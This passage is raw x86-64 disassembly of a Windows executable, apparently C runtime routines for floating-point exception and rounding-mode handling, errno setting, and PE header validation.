   14000c4b1:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000c4b6:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000c4bb:	44 8b 05 36 d3 00 00 	mov    0xd336(%rip),%r8d        # 0x1400197f8
   14000c4c2:	24 06                	and    $0x6,%al
   14000c4c4:	3c 06                	cmp    $0x6,%al
   14000c4c6:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000c4ca:	44 89 05 27 d3 00 00 	mov    %r8d,0xd327(%rip)        # 0x1400197f8
   14000c4d1:	44 89 05 24 d3 00 00 	mov    %r8d,0xd324(%rip)        # 0x1400197fc
   14000c4d8:	33 c0                	xor    %eax,%eax
   14000c4da:	48 83 c4 10          	add    $0x10,%rsp
   14000c4de:	5b                   	pop    %rbx
   14000c4df:	c3                   	ret
   14000c4e0:	48 83 ec 38          	sub    $0x38,%rsp
   14000c4e4:	48 8d 05 a5 92 00 00 	lea    0x92a5(%rip),%rax        # 0x140015790
   14000c4eb:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000c4f1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c4f6:	e8 05 00 00 00       	call   0x14000c500
   14000c4fb:	48 83 c4 38          	add    $0x38,%rsp
   14000c4ff:	c3                   	ret
   14000c500:	48 8b c4             	mov    %rsp,%rax
   14000c503:	48 83 ec 68          	sub    $0x68,%rsp
   14000c507:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000c50b:	0f 28 f1             	movaps %xmm1,%xmm6
   14000c50e:	41 8b d1             	mov    %r9d,%edx
   14000c511:	0f 28 d8             	movaps %xmm0,%xmm3
   14000c514:	41 83 e8 01          	sub    $0x1,%r8d
   14000c518:	74 2a                	je     0x14000c544
   14000c51a:	41 83 f8 01          	cmp    $0x1,%r8d
   14000c51e:	75 69                	jne    0x14000c589
   14000c520:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000c524:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000c527:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000c52c:	45 8b c8             	mov    %r8d,%r9d
   14000c52f:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000c534:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   14000c53b:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   14000c542:	eb 2d                	jmp    0x14000c571
   14000c544:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000c54b:	00 
   14000c54c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000c54f:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000c555:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000c55b:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000c561:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000c568:	00 
   14000c569:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000c570:	00 
   14000c571:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000c578:	00 
   14000c579:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   14000c57f:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000c584:	e8 b7 fd ff ff       	call   0x14000c340
   14000c589:	0f 28 c6             	movaps %xmm6,%xmm0
   14000c58c:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000c591:	48 83 c4 68          	add    $0x68,%rsp
   14000c595:	c3                   	ret
   14000c596:	cc                   	int3
   14000c597:	cc                   	int3
   14000c598:	cc                   	int3
   14000c599:	cc                   	int3
   14000c59a:	cc                   	int3
   14000c59b:	cc                   	int3
   14000c59c:	cc                   	int3
   14000c59d:	cc                   	int3
   14000c59e:	cc                   	int3
   14000c59f:	cc                   	int3
   14000c5a0:	cc                   	int3
   14000c5a1:	cc                   	int3
   14000c5a2:	cc                   	int3
   14000c5a3:	cc                   	int3
   14000c5a4:	cc                   	int3
   14000c5a5:	cc                   	int3
   14000c5a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c5ad:	00 00 00 
   14000c5b0:	48 83 ec 08          	sub    $0x8,%rsp
   14000c5b4:	0f ae 1c 24          	stmxcsr (%rsp)
   14000c5b8:	8b 04 24             	mov    (%rsp),%eax
   14000c5bb:	48 83 c4 08          	add    $0x8,%rsp
   14000c5bf:	c3                   	ret
   14000c5c0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c5c4:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000c5c9:	c3                   	ret
   14000c5ca:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000c5cf:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000c5d4:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000c5d8:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000c5dd:	c3                   	ret
   14000c5de:	66 0f 2e 05 ba 91 00 	ucomisd 0x91ba(%rip),%xmm0        # 0x1400157a0
   14000c5e5:	00 
   14000c5e6:	73 14                	jae    0x14000c5fc
   14000c5e8:	66 0f 2e 05 b8 91 00 	ucomisd 0x91b8(%rip),%xmm0        # 0x1400157a8
   14000c5ef:	00 
   14000c5f0:	76 0a                	jbe    0x14000c5fc
   14000c5f2:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   14000c5f7:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   14000c5fc:	c3                   	ret
   14000c5fd:	cc                   	int3
   14000c5fe:	cc                   	int3
   14000c5ff:	cc                   	int3
   14000c600:	48 83 ec 48          	sub    $0x48,%rsp
   14000c604:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000c609:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000c60e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000c613:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000c618:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c61d:	e8 06 00 00 00       	call   0x14000c628
   14000c622:	48 83 c4 48          	add    $0x48,%rsp
   14000c626:	c3                   	ret
   14000c627:	cc                   	int3
   14000c628:	48 8b c4             	mov    %rsp,%rax
   14000c62b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000c62f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000c633:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000c637:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000c63b:	55                   	push   %rbp
   14000c63c:	48 8b ec             	mov    %rsp,%rbp
   14000c63f:	48 83 ec 20          	sub    $0x20,%rsp
   14000c643:	48 8b da             	mov    %rdx,%rbx
   14000c646:	41 8b f1             	mov    %r9d,%esi
   14000c649:	33 d2                	xor    %edx,%edx
   14000c64b:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000c650:	89 51 04             	mov    %edx,0x4(%rcx)
   14000c653:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c657:	89 50 08             	mov    %edx,0x8(%rax)
   14000c65a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c65e:	89 50 0c             	mov    %edx,0xc(%rax)
   14000c661:	41 f6 c0 10          	test   $0x10,%r8b
   14000c665:	74 0d                	je     0x14000c674
   14000c667:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c66b:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000c670:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000c674:	41 f6 c0 02          	test   $0x2,%r8b
   14000c678:	74 0d                	je     0x14000c687
   14000c67a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c67e:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000c683:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000c687:	41 f6 c0 01          	test   $0x1,%r8b
   14000c68b:	74 0d                	je     0x14000c69a
   14000c68d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c691:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000c696:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000c69a:	41 f6 c0 04          	test   $0x4,%r8b
   14000c69e:	74 0d                	je     0x14000c6ad
   14000c6a0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c6a4:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000c6a9:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000c6ad:	41 f6 c0 08          	test   $0x8,%r8b
   14000c6b1:	74 0d                	je     0x14000c6c0
   14000c6b3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c6b7:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000c6bc:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000c6c0:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c6c4:	48 8b 03             	mov    (%rbx),%rax
   14000c6c7:	48 c1 e8 07          	shr    $0x7,%rax
   14000c6cb:	c1 e0 04             	shl    $0x4,%eax
   14000c6ce:	f7 d0                	not    %eax
   14000c6d0:	33 41 08             	xor    0x8(%rcx),%eax
   14000c6d3:	83 e0 10             	and    $0x10,%eax
   14000c6d6:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c6d9:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c6dd:	48 8b 03             	mov    (%rbx),%rax
   14000c6e0:	48 c1 e8 09          	shr    $0x9,%rax
   14000c6e4:	c1 e0 03             	shl    $0x3,%eax
   14000c6e7:	f7 d0                	not    %eax
   14000c6e9:	33 41 08             	xor    0x8(%rcx),%eax
   14000c6ec:	83 e0 08             	and    $0x8,%eax
   14000c6ef:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c6f2:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c6f6:	48 8b 03             	mov    (%rbx),%rax
   14000c6f9:	48 c1 e8 0a          	shr    $0xa,%rax
   14000c6fd:	c1 e0 02             	shl    $0x2,%eax
   14000c700:	f7 d0                	not    %eax
   14000c702:	33 41 08             	xor    0x8(%rcx),%eax
   14000c705:	83 e0 04             	and    $0x4,%eax
   14000c708:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c70b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c70f:	48 8b 03             	mov    (%rbx),%rax
   14000c712:	48 c1 e8 0b          	shr    $0xb,%rax
   14000c716:	03 c0                	add    %eax,%eax
   14000c718:	f7 d0                	not    %eax
   14000c71a:	33 41 08             	xor    0x8(%rcx),%eax
   14000c71d:	83 e0 02             	and    $0x2,%eax
   14000c720:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c723:	8b 03                	mov    (%rbx),%eax
   14000c725:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c729:	48 c1 e8 0c          	shr    $0xc,%rax
   14000c72d:	f7 d0                	not    %eax
   14000c72f:	33 41 08             	xor    0x8(%rcx),%eax
   14000c732:	83 e0 01             	and    $0x1,%eax
   14000c735:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c738:	e8 e7 02 00 00       	call   0x14000ca24
   14000c73d:	48 8b d0             	mov    %rax,%rdx
   14000c740:	a8 01                	test   $0x1,%al
   14000c742:	74 08                	je     0x14000c74c
   14000c744:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c748:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000c74c:	f6 c2 04             	test   $0x4,%dl
   14000c74f:	74 08                	je     0x14000c759
   14000c751:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c755:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000c759:	f6 c2 08             	test   $0x8,%dl
   14000c75c:	74 08                	je     0x14000c766
   14000c75e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c762:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000c766:	f6 c2 10             	test   $0x10,%dl
   14000c769:	74 08                	je     0x14000c773
   14000c76b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c76f:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000c773:	f6 c2 20             	test   $0x20,%dl
   14000c776:	74 08                	je     0x14000c780
   14000c778:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c77c:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000c780:	8b 03                	mov    (%rbx),%eax
   14000c782:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000c787:	48 23 c1             	and    %rcx,%rax
   14000c78a:	74 3e                	je     0x14000c7ca
   14000c78c:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000c792:	74 26                	je     0x14000c7ba
   14000c794:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000c79a:	74 0e                	je     0x14000c7aa
   14000c79c:	48 3b c1             	cmp    %rcx,%rax
   14000c79f:	75 30                	jne    0x14000c7d1
   14000c7a1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7a5:	83 08 03             	orl    $0x3,(%rax)
   14000c7a8:	eb 27                	jmp    0x14000c7d1
   14000c7aa:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7ae:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000c7b1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7b5:	83 08 02             	orl    $0x2,(%rax)
   14000c7b8:	eb 17                	jmp    0x14000c7d1
   14000c7ba:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7be:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000c7c1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7c5:	83 08 01             	orl    $0x1,(%rax)
   14000c7c8:	eb 07                	jmp    0x14000c7d1
   14000c7ca:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7ce:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000c7d1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7d5:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000c7db:	c1 e6 05             	shl    $0x5,%esi
   14000c7de:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000c7e4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7e8:	09 30                	or     %esi,(%rax)
   14000c7ea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c7ee:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000c7f2:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000c7f6:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000c7fa:	74 33                	je     0x14000c82f
   14000c7fc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c800:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000c805:	21 50 20             	and    %edx,0x20(%rax)
   14000c808:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000c80c:	8b 08                	mov    (%rax),%ecx
   14000c80e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c812:	89 48 10             	mov    %ecx,0x10(%rax)
   14000c815:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c819:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000c81d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c821:	21 50 60             	and    %edx,0x60(%rax)
   14000c824:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c828:	8b 0e                	mov    (%rsi),%ecx
   14000c82a:	89 48 50             	mov    %ecx,0x50(%rax)
   14000c82d:	eb 48                	jmp    0x14000c877
   14000c82f:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c833:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000c839:	8b 41 20             	mov    0x20(%rcx),%eax
   14000c83c:	41 23 c0             	and    %r8d,%eax
   14000c83f:	83 c8 02             	or     $0x2,%eax
   14000c842:	89 41 20             	mov    %eax,0x20(%rcx)
   14000c845:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000c849:	48 8b 08             	mov    (%rax),%rcx
   14000c84c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c850:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000c854:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c858:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000c85c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000c860:	8b 42 60             	mov    0x60(%rdx),%eax
   14000c863:	41 23 c0             	and    %r8d,%eax
   14000c866:	83 c8 02             	or     $0x2,%eax
   14000c869:	89 42 60             	mov    %eax,0x60(%rdx)
   14000c86c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c870:	48 8b 16             	mov    (%rsi),%rdx
   14000c873:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000c877:	e8 ec 00 00 00       	call   0x14000c968
   14000c87c:	33 d2                	xor    %edx,%edx
   14000c87e:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000c882:	8b cf                	mov    %edi,%ecx
   14000c884:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000c888:	ff 15 72 18 00 00    	call   *0x1872(%rip)        # 0x14000e100
   14000c88e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c892:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c895:	a8 10                	test   $0x10,%al
   14000c897:	74 08                	je     0x14000c8a1
   14000c899:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000c89e:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c8a1:	a8 08                	test   $0x8,%al
   14000c8a3:	74 08                	je     0x14000c8ad
   14000c8a5:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000c8aa:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c8ad:	a8 04                	test   $0x4,%al
   14000c8af:	74 08                	je     0x14000c8b9
   14000c8b1:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000c8b6:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c8b9:	a8 02                	test   $0x2,%al
   14000c8bb:	74 08                	je     0x14000c8c5
   14000c8bd:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000c8c2:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c8c5:	a8 01                	test   $0x1,%al
   14000c8c7:	74 05                	je     0x14000c8ce
   14000c8c9:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000c8ce:	8b 01                	mov    (%rcx),%eax
   14000c8d0:	83 e0 03             	and    $0x3,%eax
   14000c8d3:	74 30                	je     0x14000c905
   14000c8d5:	83 e8 01             	sub    $0x1,%eax
   14000c8d8:	74 1f                	je     0x14000c8f9
   14000c8da:	83 e8 01             	sub    $0x1,%eax
   14000c8dd:	74 0e                	je     0x14000c8ed
   14000c8df:	83 f8 01             	cmp    $0x1,%eax
   14000c8e2:	75 28                	jne    0x14000c90c
   14000c8e4:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000c8eb:	eb 1f                	jmp    0x14000c90c
   14000c8ed:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000c8f2:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000c8f7:	eb 13                	jmp    0x14000c90c
   14000c8f9:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000c8fe:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000c903:	eb 07                	jmp    0x14000c90c
   14000c905:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000c90c:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000c910:	74 07                	je     0x14000c919
   14000c912:	8b 41 50             	mov    0x50(%rcx),%eax
   14000c915:	89 06                	mov    %eax,(%rsi)
   14000c917:	eb 07                	jmp    0x14000c920
   14000c919:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000c91d:	48 89 06             	mov    %rax,(%rsi)
   14000c920:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000c925:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000c92a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000c92f:	48 83 c4 20          	add    $0x20,%rsp
   14000c933:	5d                   	pop    %rbp
   14000c934:	c3                   	ret
   14000c935:	cc                   	int3
   14000c936:	cc                   	int3
   14000c937:	cc                   	int3
   14000c938:	48 83 ec 28          	sub    $0x28,%rsp
   14000c93c:	83 f9 01             	cmp    $0x1,%ecx
   14000c93f:	74 15                	je     0x14000c956
   14000c941:	8d 41 fe             	lea    -0x2(%rcx),%eax
   14000c944:	83 f8 01             	cmp    $0x1,%eax
   14000c947:	77 18                	ja     0x14000c961
   14000c949:	e8 46 9c ff ff       	call   0x140006594
   14000c94e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000c954:	eb 0b                	jmp    0x14000c961
   14000c956:	e8 39 9c ff ff       	call   0x140006594
   14000c95b:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000c961:	48 83 c4 28          	add    $0x28,%rsp
   14000c965:	c3                   	ret
   14000c966:	cc                   	int3
   14000c967:	cc                   	int3
   14000c968:	40 53                	rex push %rbx
   14000c96a:	48 83 ec 20          	sub    $0x20,%rsp
   14000c96e:	e8 3d fc ff ff       	call   0x14000c5b0
   14000c973:	8b d8                	mov    %eax,%ebx
   14000c975:	83 e3 3f             	and    $0x3f,%ebx
   14000c978:	e8 4d fc ff ff       	call   0x14000c5ca
   14000c97d:	8b c3                	mov    %ebx,%eax
   14000c97f:	48 83 c4 20          	add    $0x20,%rsp
   14000c983:	5b                   	pop    %rbx
   14000c984:	c3                   	ret
   14000c985:	cc                   	int3
   14000c986:	cc                   	int3
   14000c987:	cc                   	int3
   14000c988:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000c98d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000c992:	57                   	push   %rdi
   14000c993:	48 83 ec 20          	sub    $0x20,%rsp
   14000c997:	48 8b da             	mov    %rdx,%rbx
   14000c99a:	48 8b f9             	mov    %rcx,%rdi
   14000c99d:	e8 0e fc ff ff       	call   0x14000c5b0
   14000c9a2:	8b f0                	mov    %eax,%esi
   14000c9a4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000c9a8:	8b cb                	mov    %ebx,%ecx
   14000c9aa:	f7 d1                	not    %ecx
   14000c9ac:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000c9b2:	23 c8                	and    %eax,%ecx
   14000c9b4:	23 fb                	and    %ebx,%edi
   14000c9b6:	0b cf                	or     %edi,%ecx
   14000c9b8:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000c9bc:	80 3d 7d c0 00 00 00 	cmpb   $0x0,0xc07d(%rip)        # 0x140018a40
   14000c9c3:	74 25                	je     0x14000c9ea
   14000c9c5:	f6 c1 40             	test   $0x40,%cl
   14000c9c8:	74 20                	je     0x14000c9ea
   14000c9ca:	e8 f1 fb ff ff       	call   0x14000c5c0
   14000c9cf:	eb 21                	jmp    0x14000c9f2
   14000c9d1:	c6 05 68 c0 00 00 00 	movb   $0x0,0xc068(%rip)        # 0x140018a40
   14000c9d8:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000c9dc:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000c9df:	e8 dc fb ff ff       	call   0x14000c5c0
   14000c9e4:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000c9e8:	eb 08                	jmp    0x14000c9f2
   14000c9ea:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000c9ed:	e8 ce fb ff ff       	call   0x14000c5c0
   14000c9f2:	8b c6                	mov    %esi,%eax
   14000c9f4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000c9f9:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000c9fe:	48 83 c4 20          	add    $0x20,%rsp
   14000ca02:	5f                   	pop    %rdi
   14000ca03:	c3                   	ret
   14000ca04:	40 53                	rex push %rbx
   14000ca06:	48 83 ec 20          	sub    $0x20,%rsp
   14000ca0a:	48 8b d9             	mov    %rcx,%rbx
   14000ca0d:	e8 9e fb ff ff       	call   0x14000c5b0
   14000ca12:	83 e3 3f             	and    $0x3f,%ebx
   14000ca15:	0b c3                	or     %ebx,%eax
   14000ca17:	8b c8                	mov    %eax,%ecx
   14000ca19:	48 83 c4 20          	add    $0x20,%rsp
   14000ca1d:	5b                   	pop    %rbx
   14000ca1e:	e9 9d fb ff ff       	jmp    0x14000c5c0
   14000ca23:	cc                   	int3
   14000ca24:	48 83 ec 28          	sub    $0x28,%rsp
   14000ca28:	e8 83 fb ff ff       	call   0x14000c5b0
   14000ca2d:	83 e0 3f             	and    $0x3f,%eax
   14000ca30:	48 83 c4 28          	add    $0x28,%rsp
   14000ca34:	c3                   	ret
   14000ca35:	cc                   	int3
   14000ca36:	cc                   	int3
   14000ca37:	cc                   	int3
   14000ca38:	cc                   	int3
   14000ca39:	cc                   	int3
   14000ca3a:	cc                   	int3
   14000ca3b:	cc                   	int3
   14000ca3c:	cc                   	int3
   14000ca3d:	cc                   	int3
   14000ca3e:	cc                   	int3
   14000ca3f:	cc                   	int3
   14000ca40:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000ca44:	45 33 c9             	xor    %r9d,%r9d
   14000ca47:	4c 03 c1             	add    %rcx,%r8
   14000ca4a:	4c 8b d2             	mov    %rdx,%r10
   14000ca4d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000ca52:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000ca57:	48 83 c0 18          	add    $0x18,%rax
   14000ca5b:	49 03 c0             	add    %r8,%rax
   14000ca5e:	45 85 db             	test   %r11d,%r11d
   14000ca61:	74 1e                	je     0x14000ca81
   14000ca63:	8b 50 0c             	mov    0xc(%rax),%edx
   14000ca66:	4c 3b d2             	cmp    %rdx,%r10
   14000ca69:	72 0a                	jb     0x14000ca75
   14000ca6b:	8b 48 08             	mov    0x8(%rax),%ecx
   14000ca6e:	03 ca                	add    %edx,%ecx
   14000ca70:	4c 3b d1             	cmp    %rcx,%r10
   14000ca73:	72 0e                	jb     0x14000ca83
   14000ca75:	41 ff c1             	inc    %r9d
   14000ca78:	48 83 c0 28          	add    $0x28,%rax
   14000ca7c:	45 3b cb             	cmp    %r11d,%r9d
   14000ca7f:	72 e2                	jb     0x14000ca63
   14000ca81:	33 c0                	xor    %eax,%eax
   14000ca83:	c3                   	ret
   14000ca84:	cc                   	int3
   14000ca85:	cc                   	int3
   14000ca86:	cc                   	int3
   14000ca87:	cc                   	int3
   14000ca88:	cc                   	int3
   14000ca89:	cc                   	int3
   14000ca8a:	cc                   	int3
   14000ca8b:	cc                   	int3
   14000ca8c:	cc                   	int3
   14000ca8d:	cc                   	int3
   14000ca8e:	cc                   	int3
   14000ca8f:	cc                   	int3
   14000ca90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ca95:	57                   	push   %rdi
   14000ca96:	48 83 ec 20          	sub    $0x20,%rsp
   14000ca9a:	48 8b d9             	mov    %rcx,%rbx
   14000ca9d:	48 8d 3d 5c 35 ff ff 	lea    -0xcaa4(%rip),%rdi        # 0x140000000
   14000caa4:	48 8b cf             	mov    %rdi,%rcx
   14000caa7:	e8 34 00 00 00       	call   0x14000cae0
   14000caac:	85 c0                	test   %eax,%eax
   14000caae:	74 22                	je     0x14000cad2
   14000cab0:	48 2b df             	sub    %rdi,%rbx
   14000cab3:	48 8b d3             	mov    %rbx,%rdx
   14000cab6:	48 8b cf             	mov    %rdi,%rcx
   14000cab9:	e8 82 ff ff ff       	call   0x14000ca40
   14000cabe:	48 85 c0             	test   %rax,%rax
   14000cac1:	74 0f                	je     0x14000cad2
   14000cac3:	8b 40 24             	mov    0x24(%rax),%eax
   14000cac6:	c1 e8 1f             	shr    $0x1f,%eax
   14000cac9:	f7 d0                	not    %eax
   14000cacb:	83 e0 01             	and    $0x1,%eax
   14000cace:	eb 02                	jmp    0x14000cad2
   14000cad0:	33 c0                	xor    %eax,%eax
   14000cad2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000cad7:	48 83 c4 20          	add    $0x20,%rsp
   14000cadb:	5f                   	pop    %rdi
   14000cadc:	c3                   	ret
   14000cadd:	cc                   	int3
   14000cade:	cc                   	int3
   14000cadf:	cc                   	int3
   14000cae0:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000cae5:	66 39 01             	cmp    %ax,(%rcx)
   14000cae8:	75 1e                	jne    0x14000cb08
   14000caea:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000caee:	48 03 d1             	add    %rcx,%rdx
   14000caf1:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000caf7:	75 0f                	jne    0x14000cb08
   14000caf9:	33 c0                	xor    %eax,%eax
   14000cafb:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000cb00:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   14000cb04:	0f 94 c0             	sete   %al
   14000cb07:	c3                   	ret
   14000cb08:	33 c0                	xor    %eax,%eax
   14000cb0a:	c3                   	ret
   14000cb0b:	cc                   	int3
   14000cb0c:	40 53                	rex push %rbx
   14000cb0e:	48 83 ec 20          	sub    $0x20,%rsp
   14000cb12:	48 8d 05 9f 8c 00 00 	lea    0x8c9f(%rip),%rax        # 0x1400157b8
   14000cb19:	48 8b d9             	mov    %rcx,%rbx
   14000cb1c:	48 89 01             	mov    %rax,(%rcx)
